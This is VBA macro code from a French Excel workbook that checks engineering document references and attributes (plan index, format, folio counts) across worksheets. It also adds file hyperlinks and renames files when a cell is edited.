    Commentaire_Cellule shCtrl_Ged, 9, 3, IniCls.ReadStringIniLangage("MsgFWK", "MsgStructure")
    Commentaire_Cellule shCtrl_Ged, 9, 4, IniCls.ReadStringIniLangage("MsgFWK", "MsgUniciteDoc")
    Commentaire_Cellule shCtrl_Ged, 9, 5, IniCls.ReadStringIniLangage("MsgFWK", "MsgRacineNom")
    Commentaire_Cellule shCtrl_Ged, 9, 7, IniCls.ReadStringIniLangage("MsgFWK", "MsgIndicePlan")
    Commentaire_Cellule shCtrl_Ged, 9, 8, IniCls.ReadStringIniLangage("MsgFWK", "MsgFormatduPlan")
    Commentaire_Cellule shCtrl_Ged, 9, 12, IniCls.ReadStringIniLangage("MsgFWK", "MsgCrtlPlanche")
    Commentaire_Cellule shCtrl_Ged, 9, 13, IniCls.ReadStringIniLangage("MsgFWK", "MsgTaillePath")
    Commentaire_Cellule shCtrl_Ged, 9, 14, IniCls.ReadStringIniLangage("MsgFWK", "MsgLinkDir")
    Commentaire_Cellule shCtrl_Ged, 9, 15, IniCls.ReadStringIniLangage("MsgFWK", "MsgLinkFile")
    Commentaire_Cellule shCtrl_Ged, 9, 16, IniCls.ReadStringIniLangage("MsgFWK", "MsgCtrlDoc")
    Commentaire_Cellule shCtrl_Ged, 9, 17, IniCls.ReadStringIniLangage("MsgFWK", "MsgDesiTDI")
    Commentaire_Cellule shCtrl_Ged, 9, 18, IniCls.ReadStringIniLangage("MsgFWK", "MsgMabecTDI")
    Commentaire_Cellule shCtrl_Ged, 9, 19, IniCls.ReadStringIniLangage("MsgFWK", "MsgFourTDI")
    Commentaire_Cellule shCtrl_Ged, 9, 20, IniCls.ReadStringIniLangage("MsgFWK", "MsgDateModif")
End Sub


Sub Sort_OutputSheet(wsCtrl_Ged As Worksheet)
    With wsCtrl_Ged
        .Activate
        .Range("A10", .Range("A10").SpecialCells(xlLastCell)).Select
        Selection.Sort Key1:=.Cells(10, outputCol_dossier), Order1:=xlAscending, _
                       Key2:=.Cells(10, outputCol_fichier), Order1:=xlAscending, _
                       Header:=xlNo, OrderCustom:=1, MatchCase:=False, Orientation:=xlTopToBottom, _
                       DataOption1:=xlSortNormal, DataOption2:=xlSortNormal
        .Range("A1").Select
    End With
End Sub


Function VerifAttribut(typeAttrib As String, valeurAttrib As String, Cellule As Range) As Boolean
    Const GA_FAMILLES_VALIDES = "D0 D1 D2 D3 D4 D5 D6 D7 D8 D9 PA PF PL PC PP PN PB PM PX PE PY PR PS PV PG PI PH PD"

    'typeAttrib doit |fffd|tre un code d'attribut valide
    '|fffd|crit la valeur de l'attribut dans la cellule sp|fffd|cifi|fffd|e
    'v|fffd|rifie que la valeur donn|fffd|e est correcte: si oui, renvoie True
    '   si non: renvoie false et d|fffd|crit le pb en commentaire de la cellule
    ' modif autorisation extension sur 2 car
    Dim MsgAttrib As String
    
    If VBA.InStr(typeAttrib, "Folio") = 0 Then Cellule.NumberFormat = "@"
    Cellule.Value = valeurAttrib
    VerifAttribut = True
    If typeAttrib = "numero" Then
        If valeurAttrib = vbNullString Then
            VerifAttribut = False
            IndiqueErreur Cellule, IniCls.ReadStringIniLangage("MsgFWK", "Msg25") '"*25Le num|fffd|ro doit |fffd|tre document|fffd|"
            Exit Function
        End If
        If VBA.Len(valeurAttrib) > 30 Then
            VerifAttribut = False
            IndiqueErreur Cellule, IniCls.ReadStringIniLangage("MsgFWK", "Msg26") '"*26Le num|fffd|ro doit faire au plus 30 caract|fffd|res"
            Exit Function
        End If
    ElseIf typeAttrib = "suffixe" Then
        If VBA.Len(valeurAttrib) <> 4 Then
            VerifAttribut = False
            IndiqueErreur Cellule, IniCls.ReadStringIniLangage("MsgFWK", "Msg27") '"*27Le suffixe doit faire 4 caract|fffd|res"
            Exit Function
        End If
        If valeurAttrib <> "----" Then
            If VBA.InStr(GA_FAMILLES_VALIDES, VBA.Left(valeurAttrib, 2)) = 0 Then
                VerifAttribut = False
                IndiqueErreur Cellule, IniCls.ReadStringIniLangage("MsgFWK", "Msg43") & VBA.Left(valeurAttrib, 2) & IniCls.ReadStringIniLangage("MsgFWK", "Msg44")
                Exit Function
            End If
        End If
    ElseIf typeAttrib = "indice" Then
        If valeurAttrib <> vbNullString Then
            If VBA.Len(valeurAttrib) <> 1 Then
                VerifAttribut = False
                IndiqueErreur Cellule, IniCls.ReadStringIniLangage("MsgFWK", "Msg28") ' "*28L'indice doit faire 1 caract|fffd|re"
                Exit Function
            End If
            If VBA.InStr("ABCDEFGHIJKLMNOPQRSTUVWXYZ", valeurAttrib) = 0 Then
                VerifAttribut = False
                IndiqueErreur Cellule, IniCls.ReadStringIniLangage("MsgFWK", "Msg29") '"*29l'indice doit |fffd|tre une lettre"
                Exit Function
            End If
        End If
    ElseIf typeAttrib = "format" Then
        If valeurAttrib <> vbNullString Then
            If VBA.Len(valeurAttrib) <> 2 Then
                VerifAttribut = False
                IndiqueErreur Cellule, IniCls.ReadStringIniLangage("MsgFWK", "Msg30") '"*30Le format doit faire 2 caract|fffd|res"
                Exit Function
            End If
            If VBA.InStr("A0 A1 A2 A3 A4", valeurAttrib) = 0 Then
                VerifAttribut = False
                IndiqueErreur Cellule, IniCls.ReadStringIniLangage("MsgFWK", "Msg31") '"*31Le format n'est pas valide"
                Exit Function
            End If
        End If
    ElseIf typeAttrib = "numFolio" Then
            If typeAttrib = "numFolio" Then MsgAttrib = IniCls.ReadStringIniLangage("MsgFWK", "Msg32") Else MsgAttrib = IniCls.ReadStringIniLangage("MsgFWK", "Msg46")                             '"*46Le nombre de planches"
            If valeurAttrib = vbNullString Then
                VerifAttribut = False
                IndiqueErreur Cellule, MsgAttrib & " " & IniCls.ReadStringIniLangage("MsgFWK", "Msg33") '"*33 doit |fffd|tre document|fffd| (implicitement ou totalement)"
                Exit Function
            End If
            If Not VBA.IsNumeric(valeurAttrib) Then
                VerifAttribut = False
                IndiqueErreur Cellule, MsgAttrib & " " & IniCls.ReadStringIniLangage("MsgFWK", "Msg34") '"*34 doit |fffd|tre num|fffd|rique"
                Exit Function
            End If
            If VBA.InStr(valeurAttrib, ".") <> 0 Then
                VerifAttribut = False
                IndiqueErreur Cellule, MsgAttrib & " " & IniCls.ReadStringIniLangage("MsgFWK", "Msg35") '"*35 doit |fffd|tre un nombre entier"
                Cellule.NumberFormat = "@"
                Cellule.Value = valeurAttrib
                Exit Function
            End If
            If VBA.Len(valeurAttrib) > 2 Then
                VerifAttribut = False
                IndiqueErreur Cellule, MsgAttrib & " " & IniCls.ReadStringIniLangage("MsgFWK", "Msg36") '"*36 doit faire au plus 2 caract|fffd|res"
                Exit Function
            End If
    ElseIf typeAttrib = "nbFolios" Then
            If typeAttrib = "numFolio" Then MsgAttrib = IniCls.ReadStringIniLangage("MsgFWK", "Msg32") Else MsgAttrib = IniCls.ReadStringIniLangage("MsgFWK", "Msg46")                             '"*46Le nombre de planches"
            If valeurAttrib = vbNullString Then
                VerifAttribut = False
                IndiqueErreur Cellule, MsgAttrib & " " & IniCls.ReadStringIniLangage("MsgFWK", "Msg33") '"*33 doit |fffd|tre document|fffd| (implicitement ou totalement)"
                Exit Function
            End If
            If Not VBA.IsNumeric(valeurAttrib) Then
                VerifAttribut = False
                IndiqueErreur Cellule, MsgAttrib & " " & IniCls.ReadStringIniLangage("MsgFWK", "Msg34") '"*34 doit |fffd|tre num|fffd|rique"
                Exit Function
            End If
            If VBA.InStr(valeurAttrib, ".") <> 0 Then
                VerifAttribut = False
                IndiqueErreur Cellule, MsgAttrib & " " & IniCls.ReadStringIniLangage("MsgFWK", "Msg35") '"*35 doit |fffd|tre un nombre entier"
                Cellule.NumberFormat = "@"
                Cellule.Value = valeurAttrib
                Exit Function
            End If
            If VBA.Len(valeurAttrib) > 2 Then
                VerifAttribut = False
                IndiqueErreur Cellule, MsgAttrib & " " & IniCls.ReadStringIniLangage("MsgFWK", "Msg36") '"*36 doit faire au plus 2 caract|fffd|res"
                Exit Function
            End If
    ElseIf typeAttrib = "extension" Then
        If VBA.Len(valeurAttrib) < 2 Or VBA.Len(valeurAttrib) > 4 Then
            If VBA.UCase(valeurAttrib) = "CATDRAWING" Then Exit Function
            VerifAttribut = False
            IndiqueErreur Cellule, IniCls.ReadStringIniLangage("MsgFWK", "Msg37") '"*37L'extension doit faire 2 ou 4 caract|fffd|res"
            Exit Function
        End If
    Else
        'cas non g|fffd|r|fffd|
        Error 5
    End If
End Function


Sub IndiqueErreur(Cellule As Range, Msg As String)
    'Formate la cellule comme cellule en erreur, met le message d'erreur en commentaire
    'Note: si 'cellule' est en fait un range de plusieurs cellule, tout le range est format|fffd|,
    '      mais le commentaire est seulement sur la premi|fffd|re cellule
    With Cellule
        If Msg <> vbNullString Then
            .NoteText Msg   'pr|fffd|voir de couper en tanches de 255 ?
            If VBA.val(Application.Version) >= 9 Then .Cells(1, 1).Comment.Shape.TextFrame.AutoSize = True
        End If
        .Font.Bold = True
        .Font.ColorIndex = 3    'rouge
    End With
End Sub


Sub IndiqueOK(Cellule As Range)
    'Formate la cellule comme cellule correcte (en vert)
    With Cellule
        .Font.Bold = True
        .Font.ColorIndex = 10    'vert
    End With
End Sub
Attribute VB_Name = "F_Analyse_Documentaire"
Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   : Analyse Documentaire
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 22/07/2008
'[Version       : V1.3 du 07/10/2009
'[---------------------------------------------------------------------------
'[Sujet: Analyse Documentaire
'[---------------------------------------------------------------------------

    Public tab_document(1 To 20000) As String
    Private tab_ind_ged(1 To 20000) As Integer

    Private Nb_Doc As Integer


Sub Analyse_Documentaire()
    frmProgression.FlagAbandon = 0
    frmProgression.lblN|fffd|Traitement = 6
    frmProgression.Show
End Sub


Sub Verification_Documentaire()
    Application.EnableEvents = False
    
    frmProgression.UpdateProgress 0 / 5, IniCls.ReadStringIniLangage("MsgFWK", "Msgload") & " " & shMateriels, frmProgression.FlagAbandon
    ThisWorkbook.Worksheets(shCde_Document).Activate
    
    ' On d|fffd|sactive tout ce qui peut l'|fffd|tre
    GererConfiguration False

    Nb_Doc = 0
    ThisWorkbook.Sheets(shCde_Document).Cells(21, 8).Value = 0
    ThisWorkbook.Sheets(shCde_Document).Cells(22, 8).Value = 0
    ThisWorkbook.Sheets(shCde_Document).Cells(23, 8).Value = 0
    ThisWorkbook.Sheets(shCde_Document).Cells(16, 2).Value = VBA.Date & "-" & VBA.Time

    '*****************
    ' Premi|fffd|re passe
    '*****************
    'Analyse feuille Mat|fffd|riel : on charge les r|fffd|f|fffd|rences d|fffd|clar|fffd|es dans Mat|fffd|riels dans Tab_Document()
    charge_document shMateriels
    
    'Analyse feuille Document : on charge les r|fffd|f|fffd|rences d|fffd|clar|fffd|es dans Documents dans Tab_Document()
    If frmProgression.FlagAbandon Then Exit Sub
    frmProgression.UpdateProgress 1 / 5, IniCls.ReadStringIniLangage("MsgFWK", "Msgload") & " " & shDocuments, frmProgression.FlagAbandon
    charge_document shDocuments
    ' Analyse feuille Ctrl_Ged : on regarde si les r|fffd|f|fffd|rences d|fffd|clar|fffd|es dans Ctrl_Ged sont pr|fffd|sentes dans Tab_Document()
    If frmProgression.FlagAbandon Then Exit Sub
    frmProgression.UpdateProgress 2 / 5, IniCls.ReadStringIniLangage("MsgFWK", "MsgCtrlDocuments"), frmProgression.FlagAbandon
    charge_ctrl_ged
    
    '*****************
    ' deuxi|fffd|me passe
    '*****************
    ' Analyse de la feuille Ctrl_Ged : on charge les r|fffd|f|fffd|rences d|fffd|clar|fffd|es dans Ctrl_Ged dans Tab_Document()
    If frmProgression.FlagAbandon Then Exit Sub
    frmProgression.UpdateProgress 3 / 5, IniCls.ReadStringIniLangage("MsgFWK", "Msgload") & " " & shCtrl_Ged, frmProgression.FlagAbandon
    charge_ctrl_ged_2
    
    If frmProgression.FlagAbandon Then Exit Sub
    frmProgression.UpdateProgress 4 / 5, IniCls.ReadStringIniLangage("MsgFWK", "Msgload") & " " & shMateriels, frmProgression.FlagAbandon
    'nettoyage des feuilles
    Worksheets(shCSV).Rows("2:1048576").Delete
    Worksheets(shCtrl_Ged).Range("Q10:S1048576").Clear
    
    ' Analyse feuille Mat|fffd|riels : on regarde si les r|fffd|f|fffd|rences d|fffd|clar|fffd|es dans Mat|fffd|riels sont pr|fffd|sentes dans Tab_Document()
    ThisWorkbook.Worksheets(shCde_Document).Activate
    charge_document_2 shMateriels
    
    If frmProgression.FlagAbandon Then Exit Sub
    frmProgression.UpdateProgress 5 / 5, IniCls.ReadStringIniLangage("MsgFWK", "MsgCtrlDocuments"), frmProgression.FlagAbandon
    ' Analyse feuille Documents : on regarde si les r|fffd|f|fffd|rences d|fffd|clar|fffd|es dans Mat|fffd|riels sont pr|fffd|sentes dans Tab_Document()
    charge_document_2 shDocuments
    
    ThisWorkbook.Sheets(shCtrl_Ged).Columns("Q:S").AutoFit
    
    Application.DisplayCommentIndicator = xlCommentIndicatorOnly
    Application.EnableEvents = True
    
    If frmProgression.FlagAbandon = 0 Then frmProgression.UpdateProgress 1, IniCls.ReadStringIniLangage("MsgFWK", "MsgTermine"), 0
    ' On active tout ce qui doit l'|fffd|tre
    GererConfiguration False
End Sub


'******************************************
' Phase 1
' Controle la d|fffd|claration des fichiers
' dans le TDI Materiels et documents
'*******************************************
Sub charge_document(Onglet As String)
    Dim deb_document As Long, Nb_max_document As Long, Lig As Long
    Dim ref_document As String
    
    Application.ScreenUpdating = False
    Init_var_dec ThisWorkbook.Worksheets(Onglet)
    Lire_Dec 4, Onglet
    Num_ligne_Dec = Num_ligne_Dec
    ThisWorkbook.Worksheets(shCde_Document).Activate
    Application.ScreenUpdating = True
    
    deb_document = FirstLine(Onglet)
    Nb_max_document = Lastline(ThisWorkbook.Worksheets(Onglet))
    
    With ThisWorkbook.Sheets(Onglet)
        .Range(.Cells(deb_document, P_CtrL_doc_dec), .Cells(Nb_max_document, P_CtrL_doc_dec)).Value = vbNullString
    End With
    Lig = deb_document
    Do Until Lig > Nb_max_document
                
        Lire_Dec Lig, Onglet
        ref_document = Document_Dec
                
        If Niveau_dec <> "FR" Then
            ' On ne charge pas les FID R qui ne sont pas des fichiers !
            Select Case ref_document
                Case vbNullString, "A0", "A1", "A2", "A3", "A4", "A?", "IN"
                    ref_document = Cle_Ref_dec 'cette clef tiend compte du suffixe
                    Nb_Doc = Nb_Doc + 1
                    tab_document(Nb_Doc) = ref_document
                Case "SP"
                    'ThisWorkbook.Sheets(Onglet).Cells(lig, P_CtrL_doc_dec).Value = vbnullstring
                    ' on ne fait Rien pas de document
                Case Is > vbNullString
                    Nb_Doc = Nb_Doc + 1
                    'ref_document = Cle_Ref_dec
                    tab_document(Nb_Doc) = ref_document
            End Select
        End If
        Lig = Lig + 1
    Loop
    If Onglet = shMateriels Then ThisWorkbook.Sheets(shCde_Document).Cells(21, 8).Value = VBA.Str(Lig - 3) Else ThisWorkbook.Sheets(shCde_Document).Cells(22, 8).Value = VBA.Str(Lig - 3)
End Sub


Sub charge_document_2(Onglet As String)
    Dim Suf_Doc As String, che_fic As String, che_fic_1 As String, nom_fic As String, Document As String
    Dim Ind_ged As Integer
    Dim deb_document As Long, Nb_max_document As Long, Lig As Long

    'Nb_csv = 1
    Nb_max_document = 0
    Application.ScreenUpdating = False
    Init_var_dec ThisWorkbook.Worksheets(Onglet)
    Lire_Dec 4, Onglet
    ThisWorkbook.Worksheets(shCde_Document).Activate
    Application.ScreenUpdating = True
    
    deb_document = FirstLine(Onglet)
    Nb_max_document = Lastline(ThisWorkbook.Worksheets(Onglet))
    Lig = deb_document
    Do Until Lig > Nb_max_document
    
        Lire_Dec Lig, Onglet
        Select Case Document_Dec 'ref_document
            Case vbNullString ', "A0", "A1", "A2", "A3", "A4", "A?", "IN"
                Document = Cle_Ref_dec 'cette clef tien compte du suffixe
            Case "A0", "A1", "A2", "A3", "A4", "A?", "IN"
                Document = Cle_Ref_dec 'cette clef tien compte du suffixe
            Case "SP"
                ' on ne fait Rien pas de document
                'ref_article = vbnullstring
                Document = vbNullString
            Case Else
                Document = Document_Dec 'Cle_Ref_dec
        End Select
        
        ThisWorkbook.Sheets(Onglet).Cells(Lig, P_CtrL_doc_dec).Value = vbNullString
        If Document > vbNullString Then
            Ind_ged = recherche_Doc(Document)
            If Ind_ged <> 0 Then
                ThisWorkbook.Sheets(Onglet).Cells(Lig, P_CtrL_doc_dec).Value = Libel_Ok '24
                Worksheets(Onglet).Cells(Lig, P_CtrL_doc_dec).Font.Color = vbBlue  'bleu
                Worksheets(Onglet).Cells(Lig, P_CtrL_doc_dec).Font.Bold = False
                'type_doc = "FIDD"
                'Nb_csv = Nb_csv + 1

                che_fic = ThisWorkbook.Sheets(shCtrl_Ged).Cells(1, 1).Value
                che_fic = VBA.Mid(che_fic, 10, VBA.Len(che_fic))
                che_fic_1 = ThisWorkbook.Sheets(shCtrl_Ged).Cells(Ind_ged, 1).Value
                
                che_fic = che_fic + VBA.Mid(che_fic_1, 3, VBA.Len(che_fic_1))
                nom_fic = ThisWorkbook.Sheets(shCtrl_Ged).Cells(Ind_ged, 2).Value
                Suf_Doc = ThisWorkbook.Sheets(shCtrl_Ged).Cells(Ind_ged, 6).Value
                
                If ThisWorkbook.Sheets(shCtrl_Ged).Cells(Ind_ged, 17).Value = vbNullString Then ThisWorkbook.Sheets(shCtrl_Ged).Cells(Ind_ged, 17).Value = Design_Dec
                If ThisWorkbook.Sheets(shCtrl_Ged).Cells(Ind_ged, 18).Value = vbNullString Then ThisWorkbook.Sheets(shCtrl_Ged).Cells(Ind_ged, 18).Value = SacimMabec_Dec Else ThisWorkbook.Sheets(shCtrl_Ged).Cells(Ind_ged, 18).Font.Bold = True
                If ThisWorkbook.Sheets(shCtrl_Ged).Cells(Ind_ged, 19).Value = vbNullString Then ThisWorkbook.Sheets(shCtrl_Ged).Cells(Ind_ged, 19).Value = Etude_nom_Dec
            Else
                If (Niveau_dec <> "FR") Then ' And (Niveau_dec <> "E") Then
                    ThisWorkbook.Sheets(Onglet).Cells(Lig, P_CtrL_doc_dec).Value = Libel_Nok
                    Worksheets(Onglet).Cells(Lig, P_CtrL_doc_dec).Font.Bold = True
                    Worksheets(Onglet).Cells(Lig, P_CtrL_doc_dec).Font.Color = vbRed     'rouge
                End If
            End If
        Else
            ThisWorkbook.Sheets(Onglet).Cells(Lig, P_CtrL_doc_dec).Value = Libel_Ntr
            Worksheets(Onglet).Cells(Lig, P_CtrL_doc_dec).Font.Bold = False
            Worksheets(Onglet).Cells(Lig, P_CtrL_doc_dec).Font.Color = vbBlack
            'Cr|fffd|ation FiD R
            'type_doc = "FIDD"
        End If
        If Onglet = shMateriels Then ThisWorkbook.Sheets(shCde_Document).Cells(21, 8).Value = VBA.Str(Lig - 3) Else ThisWorkbook.Sheets(shCde_Document).Cells(22, 8).Value = VBA.Str(Lig - 3)
        Lig = Lig + 1
    Loop
End Sub


Sub charge_ctrl_ged()
    Dim erreur As String
    Dim Pos As Integer, nb_ligne_ctrl_ged As Integer, Ind_ged As Integer
    Dim suf_article As String, ref_article As String
    Dim deb_ctrl_ged As Long, Nb_max_ctrl_ged As Long, Lig As Long

    nb_ligne_ctrl_ged = 0
    
    deb_ctrl_ged = FirstLine(shCtrl_Ged)
    Nb_max_ctrl_ged = Lastline(ThisWorkbook.Worksheets(shCtrl_Ged))
    Lig = deb_ctrl_ged
    Do Until Lig > Nb_max_ctrl_ged
                
        ref_article = VBA.UCase(ThisWorkbook.Sheets(shCtrl_Ged).Cells(Lig, 5))
        suf_article = VBA.UCase(ThisWorkbook.Sheets(shCtrl_Ged).Cells(Lig, 6))
        erreur = ThisWorkbook.Sheets(shCtrl_Ged).Cells(Lig, 3)
        
        'Worksheets(shCtrl_ged).Cells(Lig, 12).Font.Color = vbRed     'rouge
        If Worksheets(shCtrl_Ged).Cells(Lig, 3).Value = Libel_Nok Then
            erreur = Libel_Ok
            ref_article = VBA.UCase(ThisWorkbook.Sheets(shCtrl_Ged).Cells(Lig, 2).Value)
            Pos = VBA.InStr(ref_article, ".")
            If Pos > 0 Then ref_article = VBA.Mid(ref_article, 1, Pos - 1)
            ThisWorkbook.Sheets(shCtrl_Ged).Cells(Lig, 5).Value = ref_article
        End If
        
        If ref_article > vbNullString And erreur = Libel_Ok Then
            If suf_article = "----" Or suf_article = vbNullString Then ref_article = ref_article Else ref_article = ref_article + "_" + suf_article
            nb_ligne_ctrl_ged = nb_ligne_ctrl_ged + 1
            If exist_document(ref_article) Then
                ThisWorkbook.Sheets(shCtrl_Ged).Cells(Lig, 16).Value = Libel_Ok
                ThisWorkbook.Sheets(shCtrl_Ged).Cells(Lig, 16).Font.Color = vbBlue
            Else
                ThisWorkbook.Sheets(shCtrl_Ged).Cells(Lig, 16).Value = Libel_Nok
                Worksheets(shCtrl_Ged).Cells(Lig, 16).Font.Color = vbRed
            End If
        Else
            ThisWorkbook.Sheets(shCtrl_Ged).Cells(Lig, 16).Value = Libel_Ntr
        End If
        Lig = Lig + 1
    Loop
    ThisWorkbook.Sheets(shCde_Document).Cells(23, 8).Value = Lig - 9
End Sub


Sub charge_ctrl_ged_2()
    Dim deb_ctrl_ged As Long, Nb_max_ctrl_ged As Long, Lig As Long
    Dim che_fic As String, che_fic_1 As String, nom_fic As String, ref_document As String

    Nb_Doc = 0
    deb_ctrl_ged = 10

    deb_ctrl_ged = FirstLine(shCtrl_Ged)
    Nb_max_ctrl_ged = Lastline(ThisWorkbook.Worksheets(shCtrl_Ged))
   
    Lig = deb_ctrl_ged
    Do Until Lig > Nb_max_ctrl_ged
        che_fic = ThisWorkbook.Sheets(shCtrl_Ged).Cells(1, 1).Value
        che_fic = VBA.Mid(che_fic, 10, VBA.Len(che_fic))
        che_fic_1 = ThisWorkbook.Sheets(shCtrl_Ged).Cells(Lig, 1).Value
        che_fic = che_fic + VBA.Mid(che_fic_1, 3, VBA.Len(che_fic_1))
        nom_fic = ThisWorkbook.Sheets(shCtrl_Ged).Cells(Lig, 2).Formula 'Modif ACH du 05/10/2009, pour Traitement du '=' dans les Noms de Fichiers
        If ThisWorkbook.Sheets(shCtrl_Ged).Cells(Lig, 2).Formula <> vbNullString Then
            With Worksheets(shCtrl_Ged)
                .Hyperlinks.Add .Range("N" + VBA.LTrim(Lig)), che_fic '"http://www.w3.org"
                .Hyperlinks.Add .Range("O" + VBA.LTrim(Lig)), che_fic + "\" + nom_fic '"http://www.w3.org"
            End With
        End If
        ref_document = Lire_Valeur_Cellule(Lig, 5, shCtrl_Ged)
        If ref_document > vbNullString Then
            If Lire_Valeur_Cellule(Lig, 6, shCtrl_Ged) = "----" Or Lire_Valeur_Cellule(Lig, 6, shCtrl_Ged) = vbNullString Then ref_document = Lire_Valeur_Cellule(Lig, 5, shCtrl_Ged) Else ref_document = ref_document + "_" + Lire_Valeur_Cellule(Lig, 6, shCtrl_Ged)
            Nb_Doc = Nb_Doc + 1
            tab_document(Nb_Doc) = ref_document
            tab_ind_ged(Nb_Doc) = Lig
        End If
        Lig = Lig + 1
    Loop
    ThisWorkbook.Sheets(shCde_Document).Cells(23, 8).Value = VBA.Str(Lig - 9)
End Sub


'******************************************
' Phase 2
' Controle l'existance du fichiers documentaire
' Via r|fffd|sultat CTRL_GED
'*******************************************
Function recherche_Doc(Ch As String) As Integer
    Dim i As Integer
    Dim Fin As Boolean
    
    recherche_Doc = 0
    ' On recherche le libell|fffd| exact
    ' Initialisation
    Fin = False
    i = 1
    While Not Fin
        'penser |fffd| initialiser la table
        If tab_document(i) = Ch Then
            recherche_Doc = tab_ind_ged(i)
            Fin = True
        Else
            i = i + 1
            If i > Nb_Doc Then Fin = True
        End If
    Wend
    ' Si le libell|fffd| exact n'est pas trouv|fffd|, on recherche un libell|fffd| approchant
    ' ... cas des documents raccroch|fffd|s |fffd| un article ou un sous-ensemble
    ' ... et pour lesquels on raccroche un document quel que soit son suffixe
    If recherche_Doc = 0 Then
        Fin = False
        i = 1
        While Not Fin
            'penser |fffd| initialiser la table
            If VBA.InStr(1, tab_document(i), Ch & "_") > 0 Then 'VBA.InStr(1, Ch & "_", tab_document(i)) > 0 Or
                recherche_Doc = tab_ind_ged(i)
                Fin = True
            Else
                i = i + 1
                If i > Nb_Doc Then Fin = True
            End If
        Wend
    End If
End Function


Function exist_document(Ch As String) As Boolean
    Dim i As Integer
    Dim bFound As Boolean, bFin As Boolean
    bFound = False
    exist_document = False
    ' On recherche le libell|fffd| exact
    ' Initialisation
    i = 1
    bFin = False
    While Not bFin
        If tab_document(i) = Ch Then
            bFound = True
            bFin = True
        Else
            If i > Nb_Doc Then bFin = True
            i = i + 1
        End If
    Wend
    If Not (bFound) Then
        i = 1
        bFin = False
        While Not bFin
            If tab_document(i) <> vbNullString And VBA.InStr(1, Ch, tab_document(i)) > 0 Then '(VBA.InStr(1, tab_document(i), Ch) > 0 Or
                bFound = True
                bFin = True
            Else
                If i > Nb_Doc Then bFin = True
                i = i + 1
            End If
        Wend
    End If
    exist_document = bFound
End Function


Attribute VB_Name = "Feuil1"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True

Attribute VB_Name = "Feuil10"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Feuil11"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Feuil12"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Private Sub Worksheet_Change(ByVal Target As Range)
    Dim sOldFileName As String, sNewFileName As String, sDirName As String
    If Target.Cells.Count = 1 Then
        If (Target.row >= 10) And (Target.Column = 2) Then
            sDirName = VBA.Mid(Cells(1, 1).Value, 10)
            sDirName = sDirName & Target.Offset(0, 12).Value & "\"
            sOldFileName = Target.Offset(0, 13).Value
            sNewFileName = Target.Value
            Name sDirName & sOldFileName As sDirName & sNewFileName
            Application.EnableEvents = False
            Target.Offset(0, 13).Value = sNewFileName
            Application.EnableEvents = True
        End If
    End If
End Sub
Attribute VB_Name = "Feuil13"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Feuil14"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Feuil15"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Feuil16"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Feuil17"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Feuil18"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Feuil19"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Option Explicit

'[---------------------------------------------------------------------------
'[Identifiant   : Gestion des Modifications de l'onglet Decoupage
'[Auteur        : Alain CHERMAT
'[Service       :
'[Date cr|fffd|ation : 25/09/2008
'[Version       : V1.0 du 25/09/2008
'[---------------------------------------------------------------------------
'[Sujet: Gestion des Modifications de l'onglet Decoupage
'[---------------------------------------------------------------------------

Private Sub Worksheet_Change(ByVal Target As Range)
    On Error GoTo Fin

    Application.EnableEvents = False
    If Target.Count <> 1 Then 'Plusieurs cellules concern|fffd|es
        If ThisWorkbook.Sheets(ShAffaire).Range("Champ_Suivi_Modifications").Value = "O" Then Sauvegarde_historique Target
        GoTo Fin
    End If
    
    If Target.row < FirstLine(shDecoupage) Then GoTo Fin
    If Target.Column < 2 Then GoTo Fin
    If Target.Column > 45 Then GoTo Fin
    If Target.Column = 19 Then GoTo Fin 'Date de Modification
